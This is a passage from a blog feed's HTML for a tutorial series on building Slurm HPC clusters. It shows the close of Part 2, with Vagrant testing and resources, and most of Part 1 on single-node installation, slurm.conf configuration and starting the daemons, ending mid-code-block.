slurmctld              │  │  Job Scheduling</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  │ slurmdbd + MariaDB     │  │  Accounting</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  │ NFS Server             │  │  Shared Storage</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  │ Prometheus + Grafana   │  │  Monitoring</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  │ Alertmanager           │  │  Alerts</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  └────────────────────────┘  │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └────┬──────────────────┬──────┘</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">         │                  │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ┌────▼─────┐       ┌───▼──────┐</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │ worker-01│       │ worker-02│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │ ┌──────┐ │       │ ┌──────┐ │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │ │slurmd│ │       │ │slurmd│ │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │ │NFS ↑ │ │       │ │NFS ↑ │ │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │ └──────┘ │       │ └──────┘ │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └──────────┘       └──────────┘</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="for-developers-local-testing-with-vagrant">For Developers: Local Testing with Vagrant<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#for-developers-local-testing-with-vagrant" class="hash-link" aria-label="Direct link to For Developers: Local Testing with Vagrant" title="Direct link to For Developers: Local Testing with Vagrant" translate="no">​</a></h2>
<p>If you want to test the deployment locally using VMs:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install Vagrant with libvirt provider</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> scripts/setup.sh </span><span class="token number" style="color:hsl(35, 99%, 36%)">24.04</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create local VMs and deploy cluster</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">vagrant up</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># SSH to controller</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">vagrant </span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> controller-01</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Destroy VMs when done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">vagrant destroy </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
<p>In this post, we've covered:</p>
<ol>
<li class=""><strong>Why Automation</strong>: The benefits of using Ansible for cluster management</li>
<li class=""><strong>Production Architecture</strong>: Multi-node setup with monitoring and alerting</li>
<li class=""><strong>Slack Integration</strong>: Proactive monitoring with notifications</li>
<li class=""><strong>Automated Deployment</strong>: One command to deploy the entire cluster</li>
<li class=""><strong>Verification</strong>: Testing your cluster thoroughly</li>
</ol>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><strong>What's Next?</strong></p><p>In <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3">Part 3</a>, we'll cover daily administration tasks, troubleshooting, security best practices, and advanced resource management.</p></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="resources">Resources<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#resources" class="hash-link" aria-label="Direct link to Resources" title="Direct link to Resources" translate="no">​</a></h2>
<ul>
<li class=""><strong>GitHub Repository</strong>: <a href="https://github.com/riverxdata/river-slurm" target="_blank" rel="noopener noreferrer" class="">RiverXData Slurm Ansible</a></li>
<li class=""><strong>Deployment Docs</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/how-to-build-slurm-scalable-using-ansible/deployment">Scalable Slurm Deployment</a></li>
<li class=""><strong>Architecture Overview</strong>: <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/how-to-build-slurm-scalable-using-ansible/overview">Slurm Architecture</a></li>
<li class=""><strong>Ansible Documentation</strong>: <a href="https://docs.ansible.com/" target="_blank" rel="noopener noreferrer" class="">docs.ansible.com</a></li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="contact">Contact<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#contact" class="hash-link" aria-label="Direct link to Contact" title="Direct link to Contact" translate="no">​</a></h2>
<p>Questions about the deployment? Reach out at: <a href="mailto:nttg8100@gmail.com" target="_blank" rel="noopener noreferrer" class="">nttg8100@gmail.com</a></p>
<hr>
<p><em>This is Part 2 of the RiverXData series on building Slurm HPC clusters. Continue to <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3">Part 3</a> for administration and best practices.</em></p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="slurm" term="slurm"/>
        <category label="hpc" term="hpc"/>
        <category label="ansible" term="ansible"/>
        <category label="automation" term="automation"/>
        <category label="devops" term="devops"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Building a Slurm HPC Cluster (Part 1) - Single Node Setup and Fundamentals]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1</id>
        <link href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1"/>
        <updated>2026-01-09T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Building a High-Performance Computing (HPC) cluster can seem daunting, but with the right approach, you can create a robust system for managing computational workloads. This is Part 1 of a 3-part series where we'll build a complete Slurm cluster from scratch.]]></summary>
        <content type="html"><![CDATA[<p>Building a High-Performance Computing (HPC) cluster can seem daunting, but with the right approach, you can create a robust system for managing computational workloads. This is <strong>Part 1</strong> of a 3-part series where we'll build a complete Slurm cluster from scratch.</p>
<p>In this first post, we'll cover the fundamentals by setting up a single-node Slurm cluster and understanding the core concepts.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="series-overview">Series Overview<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#series-overview" class="hash-link" aria-label="Direct link to Series Overview" title="Direct link to Series Overview" translate="no">​</a></h2>
<ul>
<li class=""><strong>Part 1 (This Post)</strong>: Introduction, Architecture, and Single Node Setup</li>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2">Part 2</a></strong>: Scaling to Production with Ansible</li>
<li class=""><strong><a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3">Part 3</a></strong>: Administration and Best Practices</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-slurm">Why Slurm?<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#why-slurm" class="hash-link" aria-label="Direct link to Why Slurm?" title="Direct link to Why Slurm?" translate="no">​</a></h2>
<p>When it comes to job scheduling in HPC environments, several options exist including PBS, Grid Engine, and IBM's LSF. However, Slurm (Simple Linux Utility for Resource Management) stands out for several compelling reasons:</p>
<ul>
<li class=""><strong>Open Source</strong>: Free to use with a large, active community</li>
<li class=""><strong>Scalability</strong>: Designed to scale from small clusters to the world's largest supercomputers</li>
<li class=""><strong>Flexibility</strong>: Fine-grained control over job scheduling, resource allocation, and priority settings</li>
<li class=""><strong>Integration</strong>: Works seamlessly with MPI, distributed computing frameworks (Spark, Ray, Dask), and monitoring tools</li>
<li class=""><strong>Performance</strong>: Optimized for high throughput with minimal overhead</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-slurm-architecture">Understanding Slurm Architecture<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#understanding-slurm-architecture" class="hash-link" aria-label="Direct link to Understanding Slurm Architecture" title="Direct link to Understanding Slurm Architecture" translate="no">​</a></h2>
<p>Before diving into the implementation, it's crucial to understand the key components of a Slurm cluster:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="HPC Architecture" src="https://riverxdata.github.io/river-docs/assets/images/HPC_architecture-41812b9d27b4da09fa4b92ab9cabd700.png" width="1440" height="960" class="img_ev3q"></p></figure>
<p>source: <a href="https://www.marquette.edu/high-performance-computing/architecture.php" target="_blank" rel="noopener noreferrer" class="">https://www.marquette.edu/high-performance-computing/architecture.php</a></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="core-components">Core Components<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#core-components" class="hash-link" aria-label="Direct link to Core Components" title="Direct link to Core Components" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>slurmctld (Controller Daemon)</strong>: The brain of the cluster, running on the controller node. It handles job scheduling, resource tracking, and communicates with compute nodes.</p>
</li>
<li class="">
<p><strong>slurmd (Node Daemon)</strong>: Runs on compute nodes to execute jobs and report status back to the controller.</p>
</li>
<li class="">
<p><strong>slurmdbd (Database Daemon)</strong>: Optional but recommended for storing job accounting data, resource usage tracking, and fair-share scheduling.</p>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="node-types">Node Types<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#node-types" class="hash-link" aria-label="Direct link to Node Types" title="Direct link to Node Types" translate="no">​</a></h3>
<table><thead><tr><th>Node Type</th><th>Services</th><th>Purpose</th></tr></thead><tbody><tr><td>Controller</td><td>slurmctld</td><td>Manages job scheduling and resources</td></tr><tr><td>Compute</td><td>slurmd</td><td>Executes submitted jobs</td></tr><tr><td>Login</td><td>Slurm clients</td><td>User access point for job submission</td></tr><tr><td>Database</td><td>slurmdbd, MySQL/MariaDB</td><td>Stores accounting data</td></tr></tbody></table>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slurm Architecture" src="https://riverxdata.github.io/river-docs/assets/images/slurm_arch-83c1c084e3e6e81e2babfd383b976d6d.gif" width="811" height="681" class="img_ev3q"></p></figure>
<p>source: <a href="https://www.schedmd.com/" target="_blank" rel="noopener noreferrer" class="">https://www.schedmd.com/</a></p>
<p>For a deeper understanding of Slurm architecture, check our <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/high-performance-computing/slurm-architecture">Slurm Architecture documentation</a>.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="single-node-setup---understanding-the-fundamentals">Single Node Setup - Understanding the Fundamentals<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#single-node-setup---understanding-the-fundamentals" class="hash-link" aria-label="Direct link to Single Node Setup - Understanding the Fundamentals" title="Direct link to Single Node Setup - Understanding the Fundamentals" translate="no">​</a></h2>
<p>Starting with a single-node setup helps you understand how Slurm works before scaling up. This approach is perfect for learning and local development.</p>
<div align="center"><figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slurm Logo" src="https://riverxdata.github.io/river-docs/assets/images/Slurm_logo-aa681ab3230b0e3101ed236f97071acb.svg" width="590" height="540" class="img_ev3q"></p></figure></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>This setup runs on Ubuntu 20.04 and includes all standard Slurm features. Note that this configuration is for learning purposes - for production environments, you'll want the multi-node setup covered in Part 2.</p></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="basic-installation">Basic Installation<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#basic-installation" class="hash-link" aria-label="Direct link to Basic Installation" title="Direct link to Basic Installation" translate="no">​</a></h3>
<p>First, install the required Slurm components:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> update </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-y</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-y</span><span class="token plain"> slurmd slurmctld</span><br></span></code></pre></div></div>
<p>Verify the installation:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Locate slurmd and slurmctld</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> slurmd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: /usr/sbin/slurmd</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">which</span><span class="token plain"> slurmctld</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: /usr/sbin/slurmctld</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="configuring-slurmconf">Configuring slurm.conf<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#configuring-slurmconf" class="hash-link" aria-label="Direct link to Configuring slurm.conf" title="Direct link to Configuring slurm.conf" translate="no">​</a></h3>
<p>The <code>slurm.conf</code> file is the heart of your Slurm configuration. This file must be identical across all nodes in a cluster (but for now, we just have one node).</p>
<p>Create your <code>slurm.conf</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> slurm.conf</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># slurm.conf for a single-node Slurm cluster</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ClusterName=localcluster</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldHost=localhost</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">MpiDefault=none</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ProctrackType=proctrack/linuxproc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">ReturnToService=2</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldPidFile=/run/slurmctld.pid</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldPort=6817</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdPidFile=/run/slurmd.pid</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdPort=6818</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdSpoolDir=/var/lib/slurm-llnl/slurmd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmUser=slurm</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">StateSaveLocation=/var/lib/slurm-llnl/slurmctld</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SwitchType=switch/none</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">TaskPlugin=task/none</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># TIMERS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">InactiveLimit=0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">KillWait=30</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">MinJobAge=300</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldTimeout=120</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdTimeout=300</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">Waittime=0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># SCHEDULING</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SchedulerType=sched/backfill</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SelectType=select/cons_tres</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SelectTypeParameters=CR_Core</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># ACCOUNTING (not enabled yet)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">AccountingStorageType=accounting_storage/none</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">JobAcctGatherType=jobacct_gather/none</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">JobAcctGatherFrequency=30</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># LOGGING</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldDebug=info</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmctldLogFile=/var/log/slurm-llnl/slurmctld.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdDebug=info</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">SlurmdLogFile=/var/log/slurm-llnl/slurmd.log</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># COMPUTE NODES (adjust CPUs and RealMemory to match your system)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">NodeName=localhost CPUs=2 Sockets=1 CoresPerSocket=2 ThreadsPerCore=1 RealMemory=1024 State=UNKNOWN</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># PARTITION CONFIGURATION</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">PartitionName=LocalQ Nodes=ALL Default=YES MaxTime=INFINITE State=UP</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">mv</span><span class="token plain"> slurm.conf /etc/slurm-llnl/slurm.conf</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="starting-services">Starting Services<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-1#starting-services" class="hash-link" aria-label="Direct link to Starting Services" title="Direct link to Starting Services" translate="no">​</a></h3>
<p>Start the Slurm daemons:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Start slurmd (compute daemon)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmd start</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmd status</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Start slurmctld (controller daemon)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmctld start</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">service</span><span class="token plain"> slurmctld status</span><br></span></code></pre></div></div>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="slurmd status" src="https://riverxdata.github.io/river-docs/assets/images/slurmd_status-27a3e648f8da8db229ed803a5229e185.png" width="1310" height="351" class="img_ev3q"></p></figure>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="slurmctld status" src="https://riverxdata.github.io/river-docs/assets/images/slurmctld_status-4e7ed6630174c2f0bc017d60c84c72f1.png" width="1310" height="351" class="img_ev3q"></p></figure>
<p>Test your setup by submitting a simple interactive job:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token plain"> 500MB </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pty</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check job details</span><span class="token plain"></span><br></span><span class="token-line" 